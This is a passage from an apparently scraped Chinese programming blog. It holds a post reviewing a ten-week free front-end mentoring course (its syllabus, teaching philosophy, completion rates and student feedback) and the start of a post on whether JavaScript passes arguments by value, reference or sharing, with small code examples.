位朋友們都對這個活動有興趣，雖然當初文章寫說只收 5~10 位，但仔細考量過後，發現其實每個人的需求都不太一樣，基本上可以把需求分為兩類。 第一類是想要練習前端基礎，希望我能夠出作業或是給一些指導的；第二類則是已經有前端的程式能力，希望能跟我聊聊工作上相關的事情，例如說我是怎麼到新加坡工作，要達到什麼樣的程度等等的。 針對這兩類的需求，會分為兩種方式來進行。 第一類的話大約每週或是每兩週會出一次作業（或者是之後有可能改成作業全部都先出好，大家自己可以有自己的進度），然後固定時間我會統一講解這次作業裡面你應該可以學習到的知識點，再加上我自己的一些補充。 第二類的話基本上能力沒什麼問題，我也沒有甚麼可以教的，所以主要就是跟你們約個時間，然後我們來聊聊天，就當作是參加什麼技術分享會跟隔壁的人聊聊天就好。不用有什麼太大的壓力，聊一聊也可能發現其實你的技術能力比我強。 大家都已經有寄信對我做個簡單的自我介紹了，現在換我來做個簡單的自我介紹。 我叫胡立，現在在新加坡擔任前端工程師，來這邊大約五個月左右而已。 學程式是從升國中的時候開始，一路上基本都自學，小時候寫 VB，長大之後跑去玩程式競賽寫 C/C++，之後對手機程式有興趣跑去寫 Java, Android，大學時終於踏上網頁之路學習 PHP 跟前端網頁。實習時候發覺自己對前端比較有興趣，就開始比較專攻前端以及 Node.js 後端開發 更詳細的資料你可以參考我的 Linkedin：https://www.linkedin.com/in/hulii，之後的交流大家也不用太嚴肅，就叫我 huli 或是胡立就好，太嚴肅的話我也會覺得怪怪的XDD 有關於這個教學活動，還有以下幾點要跟大家說明： 你可以「隨時退出」，因為你有可能把我想的太強，但實際教學時卻發現我好像沒那麼強，就跟你的期待有落差。如果碰到這種情況，覺得我沒有辦法給你什麼幫助的話，那你可以直接來跟我說或是怕尷尬的話隨便想個理由也可以。這沒什麼的，不用有什麼壓力。 一定要給我回饋。無論我教得好或是壞，都麻煩大家給我一點回饋，我之後會開一個匿名的 Google 表單讓大家填寫，還麻煩大家在教學結束之後給一下 feedback。 學習還是要靠自己。儘管我可能會給你一些方向，給你一些建議，但畢竟師父領進門，修行在個人，你們之後會變得怎麼樣，就看你們自己了。 就差不多是這樣了，在這邊有兩件事情要請大家幫忙，才能讓我們順利開始 加入 Slack（沒用過的可以自己去 Google 一下教學） 在 Google 表單填寫基本資料（這超級重要，一定要填） 以後 Slack 就是我跟大家溝通的管道了，所以麻煩 Slack 的通知要開一下，如果我在 Slack 上面一直沒回你的話，可以多找我幾次或是一樣寫 email 給我。 現在離四月大概還有三週的時間，我會在這段期間內盡量找「每一個人」聊一聊，如果你是第二類，就是想跟我聊一聊的話，那我們的緣分(?)大概就是聊完就結束了，因為之後我也沒有什麼可以幫的了XD 如果是第一類需要教學的，就大概根據你之前的那篇自我介紹簡單閒聊一下，也會聊到目前對這個教學活動的期待以及更具體地、希望我能夠給予的幫助，教學部份的話預計是從四月初開始，我會再找時間統一跟大家 update 一下最新的狀況。 下面附上初步想出來的第一類的教學大綱，如果你覺得下面這些你都會了，那其實沒什麼必要聽我教學，因為我能教的就這些了XD 我擅長的比較偏 js 而不是 css，所以期待能學到什麼厲害 css 技巧的朋友們可能會失望了，我自己也不太會切版，RWD 也會苦惱很久，在 css 這部分比較不能提供什麼協助。 練習實作 Twitch 遊戲畫面排版（知識點：基本 html, css） 讓畫面變得更動態（知識點：css transition） 改用 Less, Sass 或是 Stylus（知識點：css 預處理器的使用） 串接 Twitch API 拿取資料（知識點：看懂 API 文件、API 串接、Ajax、CORS） 優化：加上 infinite scroll 與 placeholder（知識點：infinite scroll, placeholder） 改用 vanilla js 實作（知識點：vanilla js） 加上多國語言（知識點：i18n, library） 把 CSS, JS 全部都 inline 到 html（知識點：gulp、為什麼需要 gulp） 我們為什麼需要用 Webpack？（知識點：webpack） 改用 React.js（知識點：React.js） （視情況增加 Redux, React-router 等等的教學，因為教學內容可能會變，就沒有先規劃那麼多） 最後幫大家條列式總結一下現在狀況： 加入 Slack，填寫 Google 表單 跟每個人都會先聊聊，但你可以選擇聊完後你要不要參加我上面那些程式課程（就是選第一類的意思） 等待我主動跟你聯絡敲時間在線上聊個天 聊完以後等待通知開課 感謝大家的配合， Huli 一開始的兩週我大概跟 20 個同學一對一聊過了，大約七成用語音三成用文字，就聊一聊彼此的狀況、從什麼時候開始學程式的、程式程度大概到哪邊以及對課程大綱的看法。 其實這個課程最重要的就是課程大綱了，我們馬上來仔細看一下！ 課程大綱背後的涵義 會擬出這個課程大綱，主要有兩個因素，第一個是因為裡面教的那些東西，剛好都跟我近期的工作內容有相關，因此教起來我會比較得心應手，畢竟自己就在碰這些東西。 第二個原因是因為我在工作上接觸到這些東西的時候，我原本也是什麼都不懂，不知道 webpack 在幹嘛、不知道 gulp 在幹嘛、不知道 infinite scroll 到底怎麼做。可是當我花一段時間理解之後，我知道為什麼當初的我覺得這麼難了。 因為我不知道是用在哪裡，我不知道是幹嘛的，或是說，我不知道「我為什麼要用」，我在網路上找了一大堆教學，每一篇都在跟我說「怎麼用」，卻很少有資料能告訴我：「為什麼要用」、「如果不用會怎樣」 在幾次教學經驗的累積過後，我找到一個我認為比較有效的教學方式，原則就是： 要先痛到，才會得到 這是什麼意思呢？ 我有一陣子很喜歡看大公司的一些架構文章，裡面寫說他們怎麼把機器架構調整成適合規模化，講說他們碰到了什麼問題，用什麼解法解決了超大資料量所帶來的 Bug。 我一開始覺得很有收穫：「哇，這些感覺好厲害啊，學到很多」。可是過一陣子之後，才發現自己什麼都沒學到。那些東西過一週之後我就全部忘掉了，好像文章根本沒看過一樣。 後來我忘記在哪邊看到一篇文章，裡面有一段傳達的意思我記得特別深刻（如果有人也看過同樣一篇，麻煩在底下留言，小弟感激不盡），文章裡面寫說，那些都是大公司的高手們痛苦過、經歷過所淬煉出來的「精華」，你怎麼可能期望你看了十分鐘，就能夠擁有他們十年的功力？ 「痛過」，是一件很重要的事。 與其直接教他們寫 SCSS，不如先讓他們寫 CSS，然後一直叫他們改顏色，叫他們改東改西。這時候他們就只能一直用文字編輯器尋找-&gt;取代，不斷重複這個循環。等到你確認他們真的痛了，再教他們 SCSS。 這時他們會有種「重獲新生」的感覺，「靠！原來還有這種東西喔，這樣就不用改這麼辛苦了，用變數就可以了」，這樣子的學習方式我認為會比起直接教有效許多。 在教他們一樣東西之前，我一定會想辦法讓他們知道說：「為什麼我需要這個」，我認為當這個問題搞懂也同意之後，才會更有動力去學習，也才能知道自己到底在學什麼，學了之後可以幹嘛。 還有另外一件事，那就是比起每一個不同的小作業，比較好的做法是「一個逐漸加強的作業」，這樣在做作業的時候，學生可以不斷地看見自己的進步，不斷地看見專案的成長，而且最後會做成一個完整的，而不是一堆零碎的、破碎的小專案。 因此，我就以這幾個概念規劃出了這些課程大綱，後來有稍作調整： 基本 HTML/CSS 練習：以 Twitch 為例 讓畫面變得更動態：神奇的 CSS transition 寫 CSS 必備神器：CSS 預處理器 從假資料到真資料：Ajax 與 API 串接 讓網頁變得更完整：加上 placeholder 與 infinite scroll 返璞歸真：vanilla js 走向國際：i18n 當我們包在一起：Webpack 節省 Request 的極致：一為全，全為一 改掉你的壞習慣：ESLint 與 standard 第十週原本是 React.js，我後來拿掉了，原因有兩個。第一個是我認為 React 放在這邊不適合，還沒到教的時機點，還不夠「痛」，而且跟前面的也沒有什麼關聯。第二個是我改作業發現很多人的 coding style 不好，所以第十週放這個，前面九週作業寫得越醜的要花越多時間改，讓他們「痛」一下。 我必須先承認，上面這個規劃並沒有很好地使用到「痛到才會得到」這個教學原則，這個是我還可以再做得更好的部分，進步空間還很大很大。 而由一個小作業逐漸加強我覺得我算是滿好的掌握到了，一開始先讓他們刻一個靜態版面，再來把 CSS 換成 SCSS，然後把假資料換成真的資料，串 API。接著加上佔位圖以及無限滾動，讓頻道可以一直滾動加載。 第六週的作業目的是拋棄 jQuery，節省檔案大小，也讓他們知道原來不靠 jQuery 還是可以寫 JavaScript 的。第七週把中文換成中英雙語，可以支援兩個語言，第八週改用 webpack 實作模組化，第九週用 gulp 讓他們知道原來很多事情都可以自動化，最後一週修正自己的 coding style。 這樣子逐漸優化的過程，他們在做下一個作業的時候就可以直接接續上一個，把一個專案變得越來越完整。 解決問題 如同我一再強調的，寫程式不是重點，重點在「解決問題」，幾乎所有事情的重點都在這個。 解決問題又可以分成以下幾點來思考： 你要解決什麼問題？ 你用什麼方法解決？ 這個方法有什麼優缺點？ 我很喜歡一個詞叫做 trade-off，中文可以翻作：權衡、取捨。 尤其是在寫程式的領域中，你做什麼事其實都是一種 trade-off，最常見的例子就是時間換空間或空間換時間，沒有那麼好康的事情讓你又有空間又有時間。好啦，其實有，但那都是用錢換來的。 我在每一週的作業說明裡面，都會提到說我們這週碰到了什麼問題。那解法呢？解法當然就是那一週要教大家的東西囉。以下我們把每一週的課程再剖開來看，自問自答上面那三個問題（解決什麼問題、如何解決、優缺點）： 基本 HTML/CSS 練習：以 Twitch 為例 解決什麼問題：我想有一個頁面可以看 Twitch 頻道 解決方法：自己寫網頁 優點可以客製化，缺點是花時間 讓畫面變得更動態：神奇的 CSS transition 解決什麼問題：想要加上效果讓頁面更精緻 解決方法：用 css transition 這個屬性來做漸變效果 優點是有了漸變效果，缺點是可能有效能問題 寫 CSS 必備神器：CSS 預處理器 解決什麼問題：寫 css 太麻煩，想要有像程式那樣的變數可以使用 解決方法：用 css 預處理器 優點是方便維護，缺點是需要多一步 compile （像這個時候，就必須衡量優缺點，在這邊顯然優點大過於缺點，因此我們有一個「好理由」採用這個解法） 從假資料到真資料：Ajax 與 API 串接 解決什麼問題：現在的資料都是寫好的，我想要有真實的資料 解決方法：串接 Twitch API 優點是資料變真的了，缺點是看到畫面的速度變慢 （如果你要解決這個問題，必定要串接 API，因此這邊的缺點其實可以忽略） 讓網頁變得更完整：加上 placeholder 與 infinite scroll 解決什麼問題：一次載入 100 個頻道太慢，並且在載入時會跑版 解決方法：採用捲動到底才載入新頻道的方式，並且加入佔位圖防止跑版 優點是使用者體驗變好、首次加載變快，缺點是 request 數量變多了 返璞歸真：vanilla js 解決什麼問題：jQuery 檔案大小太大，想減少 request 大小 解決方法：把 jQuery 拿掉，不依賴任何 Library 優點是檔案大小減少，缺點是程式碼複雜度提高，必須自己處理跨瀏覽器問題 走向國際：i18n 解決什麼問題：想要新增一種語言 解決方法：把語言放在語言檔裡，引入之後靠 window 這個全域變數傳遞 優點是可以有多個語言，缺點是污染全域變數 當我們包在一起：Webpack 解決什麼問題：解決上一次作業的全域變數污染，以及想要使用 require 的這種語法 解決方法：導入 webpack 優點是模組化開發，缺點是需要多一層打包，以及檔案大小增加 節省 Request 的極致：一為全，全為一 解決什麼問題：Request 太多 解決方法：把 JavaScript 跟 css 全部 inline 到 html 優點是減少 Request，缺點是開啟頁面的時間變慢 改掉你的壞習慣：ESLint 與 standard 解決什麼問題：寫程式碼的習慣不好，不利於團隊開發 解決方法：導入語法檢查工具 優點是統一程式碼規範，缺點是…好像沒什麼缺點 比起「webpack 是一個打包工具」這種介紹，你讓初學者們知道 webpack 到底是幹嘛的、是要解決什麼問題、要怎麼解決會有用的多。再次強調，問為什麼很重要，知道為什麼也很重要。知道背後的原因，你就可以決定你要不要用這一套解法。 你用一個東西，背後必須要有一個「好理由」。 A：我們改用 TypeScript 吧 B：為什麼？ A：因為潮啊！ 如果「潮」這個理由不夠有說服力的話而 A 又提不出其他更好的理由，那就沒有必要改用 TypeScript。 之前有一篇很紅的文章，叫做：在 2016 年學 JavaScript 是一種什麼樣的體驗，我覺得有一個很可惜的點，那就是有些人看完之後的心得都只有：「唉，對啊！前端現在也太複雜了吧！」 但我覺得這篇文章你應該去思考的是：「裡面那些工具是不是真的需要用到？那些工具想解決的問題，到底是不是我碰到的問題？」，這才是這篇文章的重點。 舉例來說，裡面有一段這樣寫： 可別用 jQuery！現在哪還有人用 jQuery。現在是 2016 年了，你絕對應該用 React。 這個理由跟上面的一樣薄弱，一個字：潮！ 當然，他也可能是其他意思，也有可能是想表達說 React 是近年趨勢，jQuery 可能會慢慢被淘汰並且不再維護，以後就有維護性的問題。這時候你就可以考慮說：這樣的情形是不是有可能發生？如果真的發生的話，會有怎樣的影響？用 React 帶來的複雜性跟 jQuery 的可維護性哪一個損害較小？ 總之呢，重點應該是「你要解決什麼問題，這問題用哪些工具來輔助最適合」，而不是一味的覺得前端怎麼那麼複雜那麼多東西。 是啊，本來就一堆東西啊，可是裡面可能有八成你根本用不到啊！ 如果你寫一個一頁式的行銷 landing page 還硬要用 React + Redux + Rx + Webpack 的話，那我也是醉了。 課程進行方式 這堂課程的進行方式是這樣的，如上所述，總共十個作業，每一個作業一週，必須「先做作業」，但做不出來也沒關係。每個禮拜二我會直播講解上一週作業並且實際示範如果是我的話，我會怎麼做。 會這樣規劃是因為「自學」無論在哪個領域，都是一個重要的技能。我想先讓同學們對於我要教的內容有概念，甚至是把作業做出來以後，我再重新講解一遍。我覺得唯有這樣，才能讓同學們對我教的東西更熟悉。 這就呼應到我上面提過的「要先痛到，才會得到」，事後有很多同學都反應他們課前預習時覺得有些東西好難，怎麼看都看不懂。可是一看完我的直播教學，就有種茅塞頓開的感覺：「哇！原來這麼簡單」。 如果相反過來呢？假如是我先上課，他們就只會覺得：「喔，是這樣寫」，接著寫作業的時候就直接抄我的解法就好了。他們學到了什麼？學到模仿我的程式碼，然後過一個禮拜完全忘記這個解法。為什麼？因為他們沒有痛過，所以沒有去思考。 來，再次強調，你寫程式的時候要思考！要思考！要思考！只有思考過，深思熟慮過的東西才是你的，你才記得住。 課程成效 講完了課程大綱的設計理念，以及我自己在這堂課最想要傳達的核心思想之後，該來談一下這堂課程的成效了。 前面有說到一共 38 人收到錄取信，到後來只有 36 人填寫基本資料，兩個人就這樣消失了。 而這 36 人之中，只有 26 人有完成第一次作業，意思是說，有 10 個人連作業都沒做，28% 的人就這樣不見了。因此之後的數據我會把參與這次課程的人數調降為 26 人。 能夠撐完十次作業的，只有 8 個人而已，大約是 30%。 下圖是每一次作業完成的人數 可以看到掉得最多的一次是 hw2 -&gt; hw3，寫 CSS 必備神器：CSS 預處理器，我也不知道為什麼這一週會掉這麼多人。 課程結束之後的問卷回饋，作業沒有做完的理由有：時間無法配合、作業難度太高、懶惰、有其他事情、沒興趣。 而問卷中有一題是：「覺得難度最高的作業是哪一個？」，大多數人的回答都是 hw5（讓網頁變得更完整：加上 placeholder 與 infinite scroll）跟 hw6（返璞歸真：vanilla js），因為以前完全沒有寫過類似的東西。 如果以後要改善的話，可以把 hw5 再細切成幾個單元，而不是一次就完成這兩項，hw6 也可以用類似的方法，這樣對學生來說應該就不會一下子難度跳這麼多，而是慢慢變難。 學員回饋 課程結束之後有請大家填了一下回饋的表單，很幸運地，大家感想都滿多的。我原本想要把原文全部貼上來，但這樣篇幅會太多，有點妨礙閱讀，因此我只擷取部份，刪除掉一些重複的內容。 老師在講解或改作業時有什麼優點？ （以下皆為回饋原文，我只修了一些排版而已） 講解的部分使用 Youtube 直播可以方便學生彈性安排時間聽課。講解的內容有個很大的優點就是 Huli 會用非常淺顯易懂的例子與概念切入，讓自己有時候花了一兩天寫的作業，聽完講解後覺得「哇靠原來這麼沒有想像那麼難」，而每一堂講解的編排有組織性，也很容易整理筆記。改作業的部分，Huli 會仔細看我有列出的 troubleshooting 並提供有用的建議，也會在做的不錯時給予滿滿的鼓勵，這對新手入門算是很棒的引導。 講解的時候講到很多我原本準備好要問的東西，而且講解方式很容易讓人理解，因為有交代原因，所以也很容易讓人接受。就像安排課程一樣，每個章節循序漸進，就會很容易理解以及接受為什麼要用這些東西，以及這些東西的好用之處。 雖然我只有交前面幾次作業，不過可以看得出來有用心在看作業。講解方面，我覺得非常好不會突然出現尷尬的時候，也講得很清楚！ 直播完整程式 live coding 過程，包括用terminal執行指令，讓我這個 terminal 生手不再害怕使用 terminal，也對它越來越熟悉了，是這次程式課後的額外驚喜收穫。講解程式會讓人覺得原來寫程式可以這麼清晰簡單，講解過程看似輕鬆卻有架構。當同學聽不懂時會用很多不同角度切入解釋，像是生活化例子或是各種相關連結以加深同學對程式的觀念和印象！ 老師在講解或改作業時有什麼缺點？ 感覺上沒什麼缺點，如果要說可以更好的地方的話，感覺上 IDE color theme 可以用字與背景對比強一點的，觀賞上能增進使用者體驗。不過整體而言不成大礙。 可以的話，可以準備個 txt 檔案把當天要說的重點寫上去順便當標題XD 當課程內容如 webpack 和 gulp 是我完全陌生的東西，也沒碰過 node.js 下，聽起來就會覺得講解速度較快，尤其直播課時會說這 webpack 和 gulp 作業算很容易，就會讓初學 node.js 的我有些感到挫折…希望自己能培養對新事物有更快速上手的能力。 這倒不算是缺點，只是小建議。如果要在直播時節省時間，可以先在直播前把可能需要用到的網站先放在瀏覽器。不過直接在直播時搜尋的好處是，我們事後要搜尋可以知道你利用什麼關鍵字去搜尋。 課程心得 回饋問卷裡的心得礙於篇幅，貼在這邊不太適合，因此我只貼兩篇寫在自己 Blog 的。 Frontend Intermediate Course - 學習心得 心得｜Huli’s Frontend Intermediate Course｜緣起與收穫 自我檢討 先來說缺點的部分，其實比起優點，我更想聽到的是缺點。因為知道缺點在哪邊才能持續改進嘛，但不知道是這次表現太好還是學生不好意思，缺點的部分回饋的比較少。 身為一個不斷追求進步的老師，就算學生沒講，自己也應該要察覺到一些缺點。 1.改作業有時候馬馬虎虎。 雖然學生說改作業很用心，但其實有時候我一次面對堆積如山的十幾個作業，很多東西都只是快速看過去而已，畢竟老師也是會懶惰的…這是我之後可以再改進的地方 2.課程規劃不夠「痛」 上面我有提到要先痛過才能理解，我覺得作業還可以再切得更細，讓學生更「痛」一點。例如說培養 coding style 的部分，可以先出一個作業規定大家：「變數名稱只能用一個英文單字，例如說 a, e, y 等等，不夠用的話加上數字變成 a0 等等」，做完一次作業之後，隔週再讓大家看自己上週寫的程式，應該會發現看不懂在幹嘛。 這個時候，他們就會知道變數命名的重要性了。 接著談談優點，開頭有提到說這是一場：「三十人的教學實驗」，實驗目標就是驗證我上面講的那些教學理念（要先痛過、要懂目的、要知道為什麼）是否真的能幫助學生學習。 從學生反饋的結果看來，我認為是可以的，這也更加確認了我以後課程的規劃方向。 有關優點的部分，我就直接貼幾個學生的回饋上來吧！從這些回饋裡面就可以發現，我想傳達的，他們都能夠確實接收到。 講解的時候講到很多我原本準備好要問的東西，而且講解方式很容易讓人理解，因為有交代原因，所以也很容易讓人接受。就像安排課程一樣，每個章節循序漸進，就會很容易理解以及接受為什麼要用這些東西，以及這些東西的好用之處。 講解程式會讓人覺得原來寫程式可以這麼清晰簡單，講解過程看似輕鬆卻有架構。當同學聽不懂時會用很多不同角度切入解釋，像是生活化例子或是各種相關連結以加深同學對程式的觀念和印象！ 很喜歡老師的教學是讓同學先寫再公布答案，讓同學有機會先嘗試各種自己先想的到或找的到的可能解法，而等到直播課時才公布老師的做法，可以有互相交流切磋的機會，也不會讓同學是腦袋空空去上課。因為都先寫好作業了，在課堂上也更易吸收和整合，也能馬上快速理解哪種情境適合哪種解法，也能一眼發現自己先前卡住的地方在哪，因為都已經卡過了。 在這次程式課也發現寫程式這件事的思考沒有想像中的複雜，可能和老師的教學大綱切的清楚乾淨，以及講解時是以「需求」為出發點。一些新手，像是我，常常在開發過程花了一堆時間，總是在寫連自己也不太懂自己幹嘛或為何而寫的code。寫code時的思考是我在這堂程式課學到的珍貴收穫。 總結 先感謝我的學生們，陪我走過了十週的課程，並且願意在結束之後給予回饋。 我一直覺得，程式教學應該要能有更好的方法，能夠幫助學生更快上手、更快理解。這次的課程讓我驗證了我目前的方向是對的，之後也會一直朝著這方向前進。 如果你對這次課程感興趣，可以前往課程的 Github 頁面觀看課程內容，或是到Youtube直接觀看影片。 也可以直接到我最近才開的線上課程平台：Lidemy 鋰學院註冊課程，完全免費！我把作業內容跟影片都上傳到上面了。（但因為課程已經結束了，所以沒有人會幫你改作業） 我認為這堂課的價值在於「先寫作業，後講解」的教學模式，因此像上面這樣把教學影片公佈出來，我不打算盈利，都是完全免費的資源，開放大家隨意取用，因為這堂課的核心價值已經不見了，所以也沒必要收費。 我希望我的課程在各個環節上都能夠公開透明，因此，若是對學員課後提交的回饋表單有興趣，這邊有學員回饋的完整備份（只有刪除掉一些個人資料）。 最後，感謝大家願意花時間閱讀這篇落落長的文章，若是對我後續的教學實驗或課程有興趣，麻煩請追蹤Lidemy 鋰學院粉絲專頁，後續的消息都會公布在那邊。 感謝。","link":"/2017/06/03/frontend-tutorial-experiment/"},{"title":"深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？","text":"前言 其實這週原本是要來寫淺拷貝跟深拷貝的差異以及實作，但在找資料的時候無意間又看到 call by value 與 call by reference 相關的文章，越研究發現越有趣。原本以為自己已經搞懂了這個問題，但沒想到看的資料越多，卻把自己弄的越糊塗。 要寫這篇文章其實有兩個不同的方式，一個是詳實記錄我研究這個問題的過程以及心中的疑惑，以及最後如何得到解答，簡單來說就是按照時間軸來寫；另外一個是當我研究完以後，再重新以自己的方式整理，並且用更簡單易懂的方式來表達。 以往我的文章大多數都走第二種路線，重新歸納整理過後再寫出一篇相對上更容易理解的文章，用我的方式帶著大家一步步跟著我的脈絡去探討問題最後得出解答。 但這次我想嘗試第一種，帶大家看看我平常寫文章的時候都看了哪些資料，以及發想的過程為何，這樣應該也滿有趣的。 Let’s go! 美麗的錯誤 開頭有講過了，我會再重新回來研究參數傳遞這個問題完全是個美麗的錯誤，我本來要寫的主題是深拷貝跟淺拷貝。 在找資料的時候，我查到了這篇文：[Javascript] 關於 JS 中的淺拷貝和深拷貝 ，我看了看之後發現如果我要來講深拷貝，我就必須先講解為什麼我們需要深拷貝，就要講到 Object 跟其他 Primitive types 的不同之處。 想到這邊，我就想到了一個老問題：JavaScript 的 Object 到底是 pass by value 還是 pass by referece？ 我依稀記得答案是前者，或者兩者都不是，而是有個新的名詞叫作 pass by sharing。 為了驗證自己的印象沒錯，我繼續動手搜尋，最後找到了[筆記] 談談JavaScript中by reference和by value的重要觀念以及重新認識 JavaScript: Day 05 JavaScript 是「傳值」或「傳址」？，後者我有印象我看過，而且驗證了我的印象是正確的。 好，話說到這裡，必須先跟大家介紹一下這三者以及之間的差異，否則沒辦法繼續往下講。 Function 的參數傳遞方式 先來一個很簡單的範例： 12345678910function swap(a, b) &#123; var temp = a; a = b; b = temp;&#125; var x = 10;var y = 20;swap(x, y);console.log(x, y) // 10, 20 當你執行完swap之後，x跟y的值並沒有交換，為什麼？因為你傳進去的東西「不是真的 x 跟 y」，而是「x 跟 y 的值的拷貝」。 也就是說a跟b其實就是另外兩個新的變數，然後存的值跟x和y一樣，但你改變了a不會改變x，因為他們是兩個不同的變數。 可以參考下面的精美小動畫： 上面這種方式就叫做：call by value（或是 pass by value），在呼叫 function 的時候把「值」給複製一份。 到這邊應該還滿好懂的，接下來要開始慢慢進入到複雜的部分了。有另外一種方法，叫做 call by reference，意思是「你傳進去的東西就是真的 x 跟 y，function 裡面的 a 跟 b 只是別名（alias）而已，改變 a 就會改變 x」 很顯然的，在 JavaScript 裡面對於像數字這種的 Primitive type，是沒有 call by reference 的，因為你絕對不可能透過 function 內的引數去改變 function 外面的變數。 對於數字不可能，那對 object 呢？ 1234567function add(obj) &#123; obj.number++&#125; var o = &#123;number: 10&#125;add(o)console.log(o.number) // 11 哪泥！居然在 function 裡面成功改變外面的東西了！難道這就是 call by reference 嗎？ 先別急，乍看之下很像，可是有一個操作會露出破綻： 12345678910function add(obj) &#123; // 讓 obj 變成一個新的 object obj = &#123; number: obj.number + 1 &#125;&#125; var o = &#123;number: 10&#125;add(o)console.log(o.number) // 10 如果是真的 call by reference，那你在 function 裡面把 obj 的值改掉了，外面的 o 也會一起被改掉，變成那個新的 object，可是從上面這段範例看起來並沒有，所以這樣做不是 call by reference。 既不是 call by value 也不是 call by reference，那這樣應該叫做什麼呢？ 有人把這種方式叫做 call by sharing，意思就是我們讓 function 裡面的那個obj跟外面的o「共享」同一個 object，所以透過裡面的 obj，你可以去修改「共享到的那個 object」的資料。 上面都跟 call by reference 看起來沒兩樣，但最大的差異是如果你在 function 裡面把 obj 重新賦值，就代表你要讓這個 obj 指向一個新的 object，所以外面的 o 依舊還是原來的值。 引入了一個新名詞之後，看起來所有問題都得到了解答，結論就是：「在 JavaScript，primitive types 是 call by value，object 是 call by sharing」 不過，這一切只是我天真的想法而已，某天我看到一句話… JavaScript 只有 call by value 這句話乍看之下完全沒道理，剛剛不是說是 call by sharing 嗎？怎麼又變成 call by value 了？ 但其實這句話是要這樣解讀的： 當你在宣告一個 object 的時候，在底層實作上，其實這個 object 存的是一個記憶體位置，或如果用 C 的方式來講，object 的底層就是一個指標。 先幫大家複習一下指標，你可以把指標看成是變數型態的一種，差別在於它所儲存的值是「記憶體位置」。 o 這個變數的值是什麼？ 這個問題的答案是我認為理解「JavaScript 只有 call by value」這句話的關鍵。 如果從上層來看，答案理所當然會是：「o 的值是 {number: 10}」。可是如果你從底層實作的角度來看，答案就會是：「o 的值是 0x01」 我們用第二個答案繼續往下講，假設 o 的值是 0x01 的話，那你在呼叫 function 的時候，傳進去的值其實就是 0x01，所以在 function 裡面的變數才可以透過這個記憶體位置去操作同樣的東西。 就是我們前面那張圖畫的，o 跟 obj 兩個變數會「指向」同一個地方。而底層實作原理就是把 o 的記憶體位置傳給 obj 嘛，不然怎麼能指向同個地方。 如果以這個角度來看，call by sharing（傳記憶體位置進去）其實就是 call by value 的一種，解釋的方式為：其實一樣是傳值的拷貝進去，只是這個值是記憶體位置。 乍聽之下有點道理，可是有個點我怎麼想都想不通： 如果你要從底層實作的原理來看，那 call by reference 不也是 call by value 的一種嗎？ 因為以底層來看，call by reference 一樣也是傳記憶體位置進去啊，那不就全世界都只有 call by value？ 後來我查到了一篇文章跟我有類似的想法：Re: [問題] 請問傳參考到底是什麼? 不過看完之後還是沒有得到解答，只有個模糊的概念，覺得這可能是一個名詞定義的問題。 抱著追根究柢的精神，我決定來看看 ECMAScript 怎麼說。 探索聖經的路程 ECMAScript 的 spec 就是 JavaScript 的聖經，在裡面你可以找到更底層的實作，而且內容絕對不會出錯。 目前能找到的相關文章，大部分的參考資料來源都是這裡：ECMA-262-3 in detail. Chapter 8. Evaluation strategy. 我原本以為這篇是 ECMA-262-3 的節錄，看完之後發現根本不是，其實只是某個人看完 ECMA-262-3 之後的筆記而已。 不過這篇其實寫得很不錯，我們可以直接看結論的部分： It can be either “call by value”, with specifying that the special case of call by value is meant — when the value is the address copy. From this position it is possible to say that everything in ECMAScript are passed by value. Or, “call by sharing”, which makes this distinction from “by reference”, and “by value”. In this case it is possible to separate passing types: primitive values are passed by value and objects — by sharing. The statement “objects are passed by reference” formally is not related to ECMAScript and is incorrect. 但可惜的是沒有說 ECMA-262 裡面到底哪個部分有提到這些，而且我怎麼查都查不到有任何人的文章有附上 ECMA-262 的參考來源。 沒辦法，只好自己找了。 我從ecma international上面下載了ECMA-262 edition 8，並且利用幾個關鍵字來找： call by reference call by value pass by reference pass by value 結果呢？結果一無所獲，完全搜尋不到這些字。接著只好把關鍵字縮小一點，利用：reference、sharing等等的關鍵字去找，找到6.2.4 The Reference Specification Type，雖然看似相關，但沒有找到最關鍵的部分。 八百多頁的文章，這樣慢慢找實在是很累，而這樣子找下來，依舊沒有任何收穫。接著我轉個念頭：「那我來搜尋 arguments 好了」，找到兩個看似相關的章節（9.4.4 ArgumentsExoticObjects 與 9.2 ECMAScript Function Objects），但依舊沒有詳細說明。 用上面的關鍵字都找不到，我決定再換個念頭：「那我來查等號的定義好了，要比較 object 的話，應該會寫說如何比較兩個 object 是否相同，應該就會提到 reference 之類的相關詞彙了！」 最後查到了這段： If x and y are the same Object value, return true. Otherwise, return false. 好，有說跟沒說一樣。查了一兩個小時發現幾乎沒進展以後，我決定放棄這個接近九百頁的版本。 後來我去下載了ECMA-262 的第一版，篇幅少很多，只有 200 頁不到，在搜尋了幾個關鍵字發現還是沒什麼結果之後，我決定把整本快速掃過一遍。 先講結論，我還是沒有找到任何跟 call by value/reference 有關的地方，可是看到一些滿有趣的東西。 例如說判斷是否相等的地方寫的不太一樣： 11.9.3 The Abstract Equality Comparison Algorithm 13.Return true if x and y refer to the same object or if they refer to objects joined to each other (see 13.1.2). Otherwise, return false. 提到了一個叫做 joined objects 的東西： 不過跟我們想找的地方還是不太一樣。 於是，我放棄了從 ECMAScript 去找答案的這個想法。 在覺得無助的同時，想起了一個也有著相似問題（到底是 call by value 還是 call by reference）的程式語言：Java。 Java is always pass-by-value 以前在寫 Java 的時候也有碰過這個問題，而且跟 JavaScript 的其實一模一樣，就是你傳一般的值進去是 by value，可是你傳 object 進去的時候又表現的像 call by reference，但是賦值的時候又不會改變外面的 object。 但看起來 Java 永遠都是 pass by value 已經是個共識了，可參考 Is Java “pass-by-reference” or “pass-by-value”?、Parameter passing in Java - by reference or by value? 跟 Java is Pass-by-Value, Dammit!。 理由其實跟我們最開始說的一樣，讓我節錄 Java is Pass-by-Value, Dammit! 的其中一句： However, Objects are not passed by reference. A correct statement would be Object references are passed by value. 以及 Parameter passing in Java - by reference or by value? 的其中一段： Now that we have some definitions of terms we can return to the question. Does Java pass objects by reference or by value? The answer is NO! The fact is that Java has no facility whatsoever to pass an object to any function! The reason is that Java has no variables that contain objects. The reason there is so much confusion is people tend to blur the distinction between an object reference variable and an object instance. All object instances in Java are allocated on the heap and can only be accessed through object references. So if I have the following: StringBuffer g = new StringBuffer( “Hello” ); The variable g does not contain the string “Hello”, it contains a reference (or pointer) to an object instance that contains the string “Hello”. g 這個變數的值並不是字串Hello，而是一個指到字串 Hello 的 reference，所以你在呼叫 function 的時候，傳進去的就是這個 reference。 我傳進去的是 reference，可是這樣並不叫 call by reference？ 聽起來超級無敵奇怪，但根本原因其實是「此 reference 非彼 reference」，我節錄一段Call by value？中的內容： Java 中 